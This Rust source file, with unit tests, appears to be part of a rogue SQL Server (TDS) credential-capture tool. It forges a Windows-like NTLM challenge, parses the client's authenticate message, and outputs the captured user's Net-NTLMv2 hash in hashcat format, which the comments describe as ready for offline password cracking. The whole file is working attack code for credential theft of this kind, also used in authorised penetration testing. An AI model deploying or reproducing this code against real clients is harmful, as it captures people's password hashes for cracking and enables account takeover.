//! NTLM over TDS (Windows Integrated Authentication).
//!
//! Flow: the client sends the LOGIN7 packet with the fIntSecurity flag and
//! an NTLM NEGOTIATE (type 1) message in the SSPI slot. The server answers
//! with an NTLM CHALLENGE (type 2) message carried in a TABULAR_RESULT
//! packet. The client responds with an NTLM AUTHENTICATE (type 3) message
//! in a follow-up SSPI packet — from which we recover the Net-NTLMv2 hash,
//! directly usable by hashcat (-m 5600) / John for offline cracking.

pub const NTLMSSP_SIGNATURE: &[u8; 8] = b"NTLMSSP\0";

pub mod message_type {
    pub const NEGOTIATE: u32 = 1;
    pub const CHALLENGE: u32 = 2;
    pub const AUTHENTICATE: u32 = 3;
}

pub mod flags {
    pub const NEGOTIATE_UNICODE: u32 = 0x0000_0001;
    pub const REQUEST_TARGET: u32 = 0x0000_0004;
    pub const NEGOTIATE_NTLM: u32 = 0x0000_0200;
    pub const NEGOTIATE_TARGET_INFO: u32 = 0x0080_0000;
    pub const NEGOTIATE_VERSION: u32 = 0x0200_0000;
    pub const NEGOTIATE_128: u32 = 0x2000_0000;
    pub const NEGOTIATE_KEY_EXCH: u32 = 0x4000_0000;
    pub const NEGOTIATE_56: u32 = 0x8000_0000;
}

pub mod av_pair {
    pub const EOL: u16 = 0x0000;
    pub const NB_COMPUTER_NAME: u16 = 0x0001;
    pub const NB_DOMAIN_NAME: u16 = 0x0002;
    pub const DNS_COMPUTER_NAME: u16 = 0x0003;
    pub const DNS_DOMAIN_NAME: u16 = 0x0004;
    pub const DNS_TREE_NAME: u16 = 0x0005;
    pub const TIMESTAMP: u16 = 0x0007;
}

/// Windows FILETIME for a unix timestamp (100ns intervals since 1601)
pub fn unix_to_filetime(unix_seconds: u64) -> u64 {
    (unix_seconds + 11_644_473_600) * 10_000_000
}

/// Extracts an NTLM message from an SSPI blob, unwrapping SPNEGO
/// encapsulation by searching for the NTLMSSP signature. Returns None for
/// non-NTLM mechanisms (Kerberos, etc.).
pub fn extract_ntlmssp(blob: &[u8]) -> Option<&[u8]> {
    if blob.starts_with(NTLMSSP_SIGNATURE) {
        return Some(blob);
    }
    let pos = blob
        .windows(8)
        .position(|w| w == NTLMSSP_SIGNATURE)
        .map(|p| p + NTLMSSP_SIGNATURE.len() - 8)?;
    // Sanity: the message type right after the signature must be known
    let rest = &blob[pos..];
    if rest.len() < 12 {
        return None;
    }
    let mtype = u32::from_le_bytes([rest[8], rest[9], rest[10], rest[11]]);
    match mtype {
        message_type::NEGOTIATE | message_type::CHALLENGE | message_type::AUTHENTICATE => {
            Some(rest)
        }
        _ => None,
    }
}

/// Builds an NTLM CHALLENGE (type 2) message with a realistic target
/// information block (NetBIOS/DNS names + timestamp), mirroring what a
/// standalone Windows SQL Server would send.
pub fn build_challenge(
    server_challenge: &[u8; 8],
    netbios_computer: &str,
    netbios_domain: &str,
    dns_computer: &str,
    dns_domain: &str,
    unix_now: u64,
) -> Vec<u8> {
    let utf16 = |s: &str| -> Vec<u8> { s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect() };

    let mut av = Vec::new();
    let push_pair = |av: &mut Vec<u8>, id: u16, value: &[u8]| {
        av.extend_from_slice(&id.to_le_bytes());
        av.extend_from_slice(&(value.len() as u16).to_le_bytes());
        av.extend_from_slice(value);
    };
    push_pair(&mut av, av_pair::NB_COMPUTER_NAME, &utf16(netbios_computer));
    push_pair(&mut av, av_pair::NB_DOMAIN_NAME, &utf16(netbios_domain));
    push_pair(&mut av, av_pair::DNS_COMPUTER_NAME, &utf16(dns_computer));
    push_pair(&mut av, av_pair::DNS_DOMAIN_NAME, &utf16(dns_domain));
    push_pair(&mut av, av_pair::DNS_TREE_NAME, &utf16(dns_domain));
    push_pair(
        &mut av,
        av_pair::TIMESTAMP,
        &unix_to_filetime(unix_now).to_le_bytes(),
    );
    push_pair(&mut av, av_pair::EOL, &[]);

    let target_name = utf16(netbios_domain);

    let mut out = Vec::new();
    out.extend_from_slice(NTLMSSP_SIGNATURE);
    out.extend_from_slice(&message_type::CHALLENGE.to_le_bytes());
    // TargetName fields (len, alloc, offset) — offset patched after the
    // payload is assembled
    out.extend_from_slice(&(target_name.len() as u16).to_le_bytes());
    out.extend_from_slice(&(target_name.len() as u16).to_le_bytes());
    let patch_target_offset = out.len();
    out.extend_from_slice(&0u32.to_le_bytes());
    // Flags
    out.extend_from_slice(
        &(flags::NEGOTIATE_56
            | flags::NEGOTIATE_KEY_EXCH
            | flags::NEGOTIATE_128
            | flags::NEGOTIATE_VERSION
            | flags::NEGOTIATE_TARGET_INFO
            | flags::NEGOTIATE_NTLM
            | flags::REQUEST_TARGET
            | flags::NEGOTIATE_UNICODE)
            .to_le_bytes(),
    );
    // Server challenge
    out.extend_from_slice(server_challenge);
    // Reserved (8 zero bytes)
    out.extend_from_slice(&[0u8; 8]);
    // TargetInfo fields — patched after payload assembly
    let patch_target_info_offset = out.len();
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    // Version: Windows 10.0.19041 style
    out.extend_from_slice(&[0x0A, 0x00, 0x75, 0x4A, 0x00, 0x00, 0x00, 0x0F]);

    // Payload: TargetName then TargetInfo
    let target_name_pos = out.len();
    out.extend_from_slice(&target_name);
    let target_info_pos = out.len();
    out.extend_from_slice(&av);

    out[patch_target_offset..patch_target_offset + 4]
        .copy_from_slice(&(target_name_pos as u32).to_le_bytes());
    out[patch_target_info_offset..patch_target_info_offset + 2]
        .copy_from_slice(&(av.len() as u16).to_le_bytes());
    out[patch_target_info_offset + 2..patch_target_info_offset + 4]
        .copy_from_slice(&(av.len() as u16).to_le_bytes());
    out[patch_target_info_offset + 4..patch_target_info_offset + 8]
        .copy_from_slice(&(target_info_pos as u32).to_le_bytes());
    out
}

/// Parsed NTLM AUTHENTICATE (type 3) message
#[derive(Debug, Clone)]
pub struct NtlmAuthenticate {
    pub domain: String,
    pub user: String,
    pub workstation: String,
    /// Raw NT response. For NTLMv2 this is the 16 byte NTProofStr followed
    /// by the variable-length blob.
    pub nt_response: Vec<u8>,
    pub lm_response: Vec<u8>,
    /// True when the NT response is longer than a legacy 24 byte NTLMv1
    pub is_ntlmv2: bool,
    /// NTLM flags from the message
    pub flags: u32,
}

impl NtlmAuthenticate {
    /// Parses an NTLM AUTHENTICATE message. Returns None when the blob is
    /// malformed or carries a different message type.
    pub fn parse(blob: &[u8]) -> Option<NtlmAuthenticate> {
        if blob.len() < 32 || &blob[0..8] != NTLMSSP_SIGNATURE {
            return None;
        }
        let mtype = u32::from_le_bytes([blob[8], blob[9], blob[10], blob[11]]);
        if mtype != message_type::AUTHENTICATE {
            return None;
        }

        let u16le = |off: usize| u16::from_le_bytes([blob[off], blob[off + 1]]);
        let u32le = |off: usize| {
            u32::from_le_bytes([blob[off], blob[off + 1], blob[off + 2], blob[off + 3]])
        };

        // Six field descriptors: (len, alloc, offset) starting at offset 12
        let field = |i: usize| -> (usize, usize) {
            let base = 12 + i * 8;
            (u16le(base) as usize, u32le(base + 4) as usize)
        };
        let (lm, nt, domain, user, workstation, _session_key) =
            (field(0), field(1), field(2), field(3), field(4), field(5));
        let flags = u32le(12 + 6 * 8);

        let bytes = |(len, off): (usize, usize)| -> Option<&[u8]> {
            if len == 0 || off >= blob.len() || off + len > blob.len() {
                return None;
            }
            Some(&blob[off..off + len])
        };
        let utf16 = |f: (usize, usize)| -> Option<String> {
            let raw = bytes(f)?;
            let units: Vec<u16> = raw
                .chunks(2)
                .map(|c| u16::from_le_bytes([c[0], *c.get(1).unwrap_or(&0)]))
                .collect();
            Some(String::from_utf16_lossy(&units))
        };

        Some(NtlmAuthenticate {
            domain: utf16(domain).unwrap_or_default(),
            user: utf16(user).unwrap_or_default(),
            workstation: utf16(workstation).unwrap_or_default(),
            nt_response: bytes(nt).map(|b| b.to_vec()).unwrap_or_default(),
            lm_response: bytes(lm).map(|b| b.to_vec()).unwrap_or_default(),
            is_ntlmv2: nt.0 > 24,
            flags,
        })
    }

    /// Formats the captured credentials as a Net-NTLMv2 hash string in
    /// hashcat -m 5600 format:
    /// `user::DOMAIN:challenge:NTProofStr:blob`
    pub fn net_ntlmv2_string(&self, server_challenge: &[u8; 8]) -> Option<String> {
        if !self.is_ntlmv2 || self.nt_response.len() <= 16 {
            return None;
        }
        let challenge_hex = hex(server_challenge);
        let proof_hex = hex(&self.nt_response[..16]);
        let blob_hex = hex(&self.nt_response[16..]);
        let domain = if self.domain.is_empty() {
            "-"
        } else {
            &self.domain
        };
        Some(format!(
            "{}::{}:{}:{}:{}",
            self.user, domain, challenge_hex, proof_hex, blob_hex
        ))
    }
}

fn hex(bytes: &[u8]) -> String {
    let mut out = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        out.push_str(&format!("{:02x}", b));
    }
    out
}

/// True when the blob starts like an NTLM NEGOTIATE (type 1) message —
/// either raw or SPNEGO-wrapped.
pub fn is_ntlm_negotiate(sspi: &[u8]) -> bool {
    match extract_ntlmssp(sspi) {
        Some(msg) => {
            msg.len() >= 12
                && u32::from_le_bytes([msg[8], msg[9], msg[10], msg[11]]) == message_type::NEGOTIATE
        }
        None => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extract_handles_raw_and_spnego() {
        let raw = b"NTLMSSP\0\x01\x00\x00\x00rest";
        assert_eq!(extract_ntlmssp(raw), Some(&raw[..]));

        // SPNEGO wrapper: garbage OID-ish prefix then the NTLM blob
        let mut wrapped = vec![
            0x60, 0x20, 0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02, 0xA0,
        ];
        wrapped.extend_from_slice(raw);
        assert_eq!(extract_ntlmssp(&wrapped), Some(&raw[..]));

        // Kerberos AP-REQ style blob: no NTLMSSP signature
        assert_eq!(extract_ntlmssp(&[0x6E, 0x82, 0x01, 0x00, 0xAA]), None);
    }

    #[test]
    fn challenge_layout() {
        let challenge = [0x11u8, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];
        let msg = build_challenge(
            &challenge,
            "WIN-SERVER01",
            "CORP",
            "win-server01.corp.local",
            "corp.local",
            1_700_000_000,
        );

        assert_eq!(&msg[0..8], NTLMSSP_SIGNATURE);
        let mtype = u32::from_le_bytes([msg[8], msg[9], msg[10], msg[11]]);
        assert_eq!(mtype, message_type::CHALLENGE);
        // Server challenge at offset 24
        assert_eq!(&msg[24..32], &challenge[..]);

        // TargetName descriptor at 12: len must match payload
        let tn_len = u16::from_le_bytes([msg[12], msg[13]]) as usize;
        let tn_off = u32::from_le_bytes([msg[16], msg[17], msg[18], msg[19]]) as usize;
        assert!(tn_off + tn_len <= msg.len());
        let tn = &msg[tn_off..tn_off + tn_len];
        let units: Vec<u16> = tn
            .chunks(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        assert_eq!(String::from_utf16(&units).unwrap(), "CORP");

        // TargetInfo descriptor at 40 (len, alloc at 40..44, offset at 44..48)
        let ti_len = u16::from_le_bytes([msg[40], msg[41]]) as usize;
        let ti_off = u32::from_le_bytes([msg[44], msg[45], msg[46], msg[47]]) as usize;
        assert!(ti_off + ti_len <= msg.len());
        let ti = &msg[ti_off..ti_off + ti_len];
        // First AV_PAIR must be NB_COMPUTER_NAME
        let id = u16::from_le_bytes([ti[0], ti[1]]);
        assert_eq!(id, av_pair::NB_COMPUTER_NAME);
        // And the block must end with an EOL pair
        let last = &ti[ti.len() - 4..];
        assert_eq!(u16::from_le_bytes([last[0], last[1]]), av_pair::EOL);
    }

    #[test]
    fn authenticate_roundtrip_and_hash_string() {
        // Build a synthetic AUTHENTICATE message the same way a client would
        let utf16 =
            |s: &str| -> Vec<u8> { s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect() };
        let domain = utf16("CORP");
        let user = utf16("alice");
        let workstation = utf16("ATTACKER-PC");
        let mut nt = vec![0xAA; 16]; // NTProofStr
        nt.extend_from_slice(&[0xBB; 44]); // blob

        let mut out = Vec::new();
        out.extend_from_slice(NTLMSSP_SIGNATURE);
        out.extend_from_slice(&message_type::AUTHENTICATE.to_le_bytes());
        let push_field = |out: &mut Vec<u8>, data: &[u8], off: &mut u32| {
            out.extend_from_slice(&(data.len() as u16).to_le_bytes());
            out.extend_from_slice(&(data.len() as u16).to_le_bytes());
            out.extend_from_slice(&off.to_le_bytes());
            *off += data.len() as u32;
        };
        let mut off = 8 + 4 + 6 * 8 + 4; // payload starts after fixed part
        push_field(&mut out, &[], &mut off); // LM response (empty for v2)
        push_field(&mut out, &nt, &mut off);
        push_field(&mut out, &domain, &mut off);
        push_field(&mut out, &user, &mut off);
        push_field(&mut out, &workstation, &mut off);
        push_field(&mut out, &[], &mut off); // session key
        out.extend_from_slice(&0x6000_8215u32.to_le_bytes()); // flags
        out.extend_from_slice(&nt);
        out.extend_from_slice(&domain);
        out.extend_from_slice(&user);
        out.extend_from_slice(&workstation);

        let auth = NtlmAuthenticate::parse(&out).expect("parse");
        assert_eq!(auth.user, "alice");
        assert_eq!(auth.domain, "CORP");
        assert_eq!(auth.workstation, "ATTACKER-PC");
        assert!(auth.is_ntlmv2);

        let challenge = [0x01u8, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08];
        let hash = auth.net_ntlmv2_string(&challenge).expect("v2 string");
        // hashcat -m 5600 shape: user::DOMAIN:challenge:proof:blob
        assert!(
            hash.starts_with(
                "alice::CORP:0102030405060708:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:bbbbbb"
            )
        );
    }

    #[test]
    fn filetime_conversion() {
        assert_eq!(unix_to_filetime(0), 116_444_736_000_000_000);
    }
}
